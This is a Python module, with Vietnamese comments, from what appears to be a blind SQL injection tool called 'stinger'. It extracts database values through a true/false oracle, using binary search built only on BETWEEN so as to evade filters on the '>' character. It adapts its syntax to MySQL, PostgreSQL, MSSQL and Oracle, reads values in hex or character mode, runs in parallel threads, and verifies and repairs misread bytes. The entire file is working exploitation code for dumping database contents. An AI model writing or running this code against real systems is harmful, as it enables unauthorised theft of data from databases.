#!/usr/bin/env python3
"""
Extract - trích xuất giá trị chuỗi qua oracle true/false, tổng quát theo dialect.

Bung logic từ draft/ (bsearch chỉ dùng BETWEEN, get_number, chế độ hex/char) nhưng
KHÔNG hardcode cú pháp MySQL. Các mảnh cú pháp (substr/ascii/length/hex/hexlit) lấy từ
`dialect` của DBMS đã chốt -> chạy được cho MySQL/PGSQL/MSSQL/Oracle.

Chế độ:
  - hex : đọc hex(value), charset [0-9A-F], binary search bằng BETWEEN. An toàn nhất,
          bắt được byte >127 (multibyte). ~5 request/hex-digit.
  - char: đọc trực tiếp từng ký tự, khoảng 0..255. ~8 request/ký tự.

(Chế độ turbo của draft phụ thuộc độ-dài-sleep, để sau - cần transport thật để hiệu chuẩn.)
"""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor
from typing import Optional

from stinger.oracle import Oracle


class ExtractError(Exception):
    pass


class Dialect:
    """Bọc dict dialect, cung cấp các hàm lắp ráp biểu thức SQL."""

    def __init__(self, d: dict):
        self.d = d

    def _need(self, key: str) -> str:
        if key not in self.d:
            raise ExtractError("dialect thiếu mảnh '%s'" % key)
        return self.d[key]

    def substr(self, src: str, i: int) -> str:
        return self._need("substr").format(s=src, i=i)

    def ascii(self, char_expr: str) -> str:
        return self._need("ascii").format(c=char_expr)

    def length(self, src: str) -> str:
        return self._need("length").format(s=src)

    def charlen(self, src: str) -> str:
        return self.d.get("charlen", self._need("length")).format(s=src)

    def hex(self, src: str) -> str:
        return self._need("hex").format(s=src)

    def hexlit(self, h: str) -> str:
        return self._need("hexlit").format(h=h)

    def notnull(self, src: str) -> str:
        return self.d.get("notnull", "(({s}) is not null)").format(s=src)

    # biểu thức "mã ký tự thứ i của src"
    def char_code_at(self, src: str, i: int) -> str:
        return self.ascii(self.substr(src, i))


# --------------------------------------------------------------------------- search
def bsearch(oracle: Oracle, expr: str, lo: int, hi: int) -> int:
    """Tìm giá trị của <expr> trong [lo,hi] CHỈ bằng BETWEEN (né filter '>')."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle.ask("%s between %d and %d" % (expr, lo, mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo


def get_number(oracle: Oracle, expr: str, hi: int = 1024) -> int:
    """Đọc một số nguyên, tự nới rộng khoảng trên nếu cần.

    hi mặc định 1024: cân bằng cho tool tổng quát - cover cả giá trị dump dài (version
    string, danh sách bảng/cột nối chuỗi) mà hiếm khi phải nới rộng, nhưng vẫn nhỏ hơn
    4096 nhiều (tiết kiệm ~2 câu hỏi/lần đo, mỗi câu có thể tốn `delay` giây). Vẫn tự gấp
    đôi khoảng nếu giá trị thực dài hơn -> không giới hạn cứng.
    """
    while not oracle.ask("%s between 0 and %d" % (expr, hi)):
        hi *= 2
        if hi > 2 ** 24:
            raise ExtractError("%s vượt quá 2^24 - có lẽ subquery trả NULL" % expr)
    return bsearch(oracle, expr, 0, hi)


# ------------------------------------------------------------- đọc từng đơn vị (1 vị trí)
def _read_hex_digit(oracle: Oracle, dia: "Dialect", src: str, i: int) -> str:
    """Đọc 1 hex-digit ở vị trí i (ký tự '0'-'9' hoặc 'A'-'F'). Độc lập -> song song được."""
    expr = dia.char_code_at(src, i)
    # '0'-'9'=48-57, 'A'-'F'=65-70
    if oracle.ask("%s between 48 and 57" % expr):
        code = bsearch(oracle, expr, 48, 57)
    else:
        code = bsearch(oracle, expr, 65, 70)
    return chr(code)


def _read_char(oracle: Oracle, dia: "Dialect", query: str, i: int) -> int:
    """Đọc mã 1 ký tự ở vị trí i (0..255). Trả về code (0 = ký tự NUL/hết chuỗi)."""
    expr = dia.char_code_at(query, i)
    return bsearch(oracle, expr, 0, 255)


def _run_positions(n: int, worker, threads: int, on_done):
    """Chạy `worker(i)` cho i=1..n. Nếu threads>1 -> song song qua ThreadPoolExecutor.

    - worker(i) trả về kết quả cho vị trí i (thứ tự 1-based).
    - on_done(done_count) gọi mỗi khi một vị trí xong (để cập nhật tiến độ).
    - Trả về list kết quả theo ĐÚNG thứ tự vị trí (1..n), bất kể thứ tự hoàn thành.
    """
    results: list = [None] * n
    if threads <= 1:
        for idx in range(n):
            results[idx] = worker(idx + 1)
            on_done(idx + 1)
        return results

    # Song song: mỗi vị trí là 1 task độc lập. Gom kết quả theo index để giữ thứ tự.
    done = 0
    with ThreadPoolExecutor(max_workers=threads) as pool:
        future_to_idx = {pool.submit(worker, idx + 1): idx for idx in range(n)}
        from concurrent.futures import as_completed
        for fut in as_completed(future_to_idx):
            idx = future_to_idx[fut]
            results[idx] = fut.result()  # ném lại exception nếu worker lỗi
            done += 1
            on_done(done)
    return results


# --------------------------------------------------------------------------- extract
def extract(oracle: Oracle,
            query: str,
            dialect: dict,
            mode: str = "hex",
            maxlen: Optional[int] = None,
            threads: int = 1,
            progress=None,
            log=None) -> tuple[bytes, dict]:
    """Trích xuất giá trị của <query>. Trả về (raw_bytes, meta).

    threads                         - số vị trí ký tự đọc song song (1 = tuần tự).
    progress(done, total, preview)  - callback tùy chọn để hiện tiến độ.
    log(msg)                        - callback tùy chọn in các bước chính.
    """
    dia = Dialect(dialect)
    meta = {}

    def _progress(done, total, preview):
        if progress:
            progress(done, total, preview)

    def _log(msg):
        if log:
            log(msg)

    # 1) subquery có dữ liệu không? NULL làm mọi điều kiện thành false âm thầm.
    _log("[extract] kiểm tra subquery có dữ liệu (IS NOT NULL)...")
    if not oracle.ask(dia.notnull(query)):
        raise ExtractError(
            "subquery trả NULL hoặc không có row. Kiểm tra tên bảng/cột và quyền."
        )

    # 2) độ dài. Ở chế độ HEX ta đọc theo BYTE (blen*2 hex-digit) -> chỉ cần length().
    #    char_length() KHÔNG cần cho việc đọc (chỉ để phát hiện multibyte) -> tính SAU
    #    khi đã có bytes (decode + đếm ký tự), MIỄN PHÍ, thay vì binary search riêng.
    #    Ở chế độ CHAR mới cần đo char_length() để biết số ký tự phải đọc.
    _log("[extract] Đo độ dài bằng binary search (length)...")
    blen = get_number(oracle, dia.length(query))
    meta["byte_len"] = blen
    _log("[extract]   length() = %d byte" % blen)

    thread_note = ("%d luồng song song" % threads) if threads > 1 else "tuần tự (1 luồng)"

    if mode == "hex":
        _log("[extract] bước 3: đọc hex(value) - %d hex-digit, mỗi digit ~5 request "
             "[%s]..." % (blen * 2, thread_note))
        src = dia.hex(query)
        n = blen * 2
        if maxlen:
            n = min(n, maxlen * 2)

        def _on_done(done):
            # tiến độ tính theo byte (2 hex-digit / byte) - xấp xỉ khi song song
            _progress(min(done // 2 + (done % 2), blen), blen, "")

        digits_list = _run_positions(
            n, lambda i: _read_hex_digit(oracle, dia, src, i), threads, _on_done)
        digits = "".join(digits_list)
        raw = bytes.fromhex(digits)
        # char_len suy ra MIỄN PHÍ từ bytes (không tốn request): số ký tự UTF-8.
        meta["char_len"] = len(raw.decode("utf-8", "replace"))
        # preview cuối (khi song song không có preview lũy tiến theo thứ tự)
        _progress(blen, blen, raw.decode("utf-8", "replace"))
        return raw, meta

    if mode == "char":
        # Chế độ char cần số KÝ TỰ. char_length() <= length() (byte) luôn đúng ->
        # tìm trong [0, blen] thay vì [0, 4096] để tiết kiệm câu hỏi.
        if maxlen:
            n = maxlen
        else:
            _log("[extract] đo char_length() (trong khoảng [0, %d])..." % blen)
            clen = get_number(oracle, dia.charlen(query), hi=max(blen, 1))
            meta["char_len"] = clen
            n = clen
        _log("[extract] bước 3: đọc trực tiếp từng ký tự - %d ký tự, mỗi ký tự ~8 request "
             "[%s]..." % (n, thread_note))

        def _on_done_c(done):
            _progress(done, n, "")

        codes = _run_positions(
            n, lambda i: _read_char(oracle, dia, query, i), threads, _on_done_c)
        out = bytearray()
        for code in codes:
            if code == 0:
                break  # NUL -> hết chuỗi (dừng ở ký tự 0 đầu tiên)
            out.append(code)
        _progress(len(out), n, out.decode("utf-8", "replace"))
        return bytes(out), meta

    raise ExtractError("mode không hỗ trợ: %s (dùng 'hex' hoặc 'char')" % mode)


def verify(oracle: Oracle, query: str, dialect: dict, data: bytes) -> bool:
    """Xác minh toàn bộ giá trị bằng 1 request, dùng hex literal (không cần nháy)."""
    dia = Dialect(dialect)
    lit = dia.hexlit(data.hex())
    return oracle.ask("(%s) between %s and %s" % (query, lit, lit))


def _byte_correct(oracle: Oracle, dia: "Dialect", src_hex: str, byte_index: int,
                  byte_val: int) -> bool:
    """Kiểm tra byte thứ `byte_index` (1-based) của value có bằng `byte_val` không.

    So sánh 2 hex-digit của byte đó với hex mong đợi. Mỗi hex-digit là 1 câu hỏi
    'ord(substr(hex,i,1)) between v and v'. Byte đúng <=> CẢ HAI hex-digit đúng.
    Đây là so khớp chính xác -> đáng tin ngay cả khi threshold dao động (chỉ cần oracle
    phân biệt được TRUE/FALSE, mà pha này chạy tuần tự nên không nhiễu đa luồng).
    """
    hex_pair = "%02X" % byte_val
    pos = (byte_index - 1) * 2  # vị trí hex-digit đầu của byte (0-based)
    for k in (0, 1):
        want = ord(hex_pair[k])
        expr = dia.char_code_at(src_hex, pos + k + 1)  # 1-based
        if not oracle.ask("%s between %d and %d" % (expr, want, want)):
            return False
    return True


def repair(oracle: Oracle,
           query: str,
           dialect: dict,
           data: bytes,
           log=None,
           max_bad_ratio: float = 0.5) -> bytes:
    """Sửa các byte đọc sai (do nhiễu đa luồng) bằng cách VERIFY + ĐỌC LẠI 1 luồng.

    QUAN TRỌNG: hàm này phải chạy với một Oracle TUẦN TỰ (không đa luồng) để phép đo
    không bị nhiễu -> verify chính xác. cli truyền oracle 1-luồng vào đây.

    Cách làm (chế độ hex - luôn dùng hex để đúng cả byte >127):
      1. Với mỗi byte i: verify 2 hex-digit của nó có khớp không. Byte sai -> ghi nhận.
      2. Đọc lại (1 luồng) các byte sai bằng binary search.
      3. Trả về bytes đã sửa.

    Nếu tỉ lệ byte sai > max_bad_ratio -> pha nhanh quá tệ, báo lỗi (không đáng sửa từng
    byte, nên chạy lại toàn bộ với ít luồng hơn).
    """
    def _log(msg):
        if log:
            log(msg)

    dia = Dialect(dialect)
    out = bytearray(data)
    n = len(out)
    if n == 0:
        return bytes(out)

    src_hex = dia.hex(query)

    # 1) verify từng byte (tuần tự) -> tìm byte sai
    bad = []
    for i in range(1, n + 1):
        if not _byte_correct(oracle, dia, src_hex, i, out[i - 1]):
            bad.append(i)

    if not bad:
        _log("[repair] verify từng byte: tất cả ĐÚNG.")
        return bytes(out)

    ratio = len(bad) / n
    _log("[repair] %d/%d byte sai (%.0f%%)." % (len(bad), n, ratio * 100))
    if ratio > max_bad_ratio:
        _log("[repair] quá nhiều byte sai -> pha đa luồng không đáng tin. "
             "Nên chạy lại với --threads nhỏ hơn.")
        # vẫn thử sửa để không mất công, nhưng cảnh báo ở trên.

    # 2) đọc lại các byte sai bằng 1 luồng (đọc 2 hex-digit của mỗi byte sai)
    _log("[repair] đọc lại %d byte sai bằng 1 luồng..." % len(bad))
    hexchars = list(out.hex().upper())
    for i in bad:
        pos = (i - 1) * 2
        hexchars[pos] = _read_hex_digit(oracle, dia, src_hex, pos + 1)
        hexchars[pos + 1] = _read_hex_digit(oracle, dia, src_hex, pos + 2)
    try:
        out = bytearray(bytes.fromhex("".join(hexchars)))
    except ValueError:
        _log("[repair] hex sau sửa không hợp lệ - giữ nguyên bản đọc đa luồng.")

    return bytes(out)
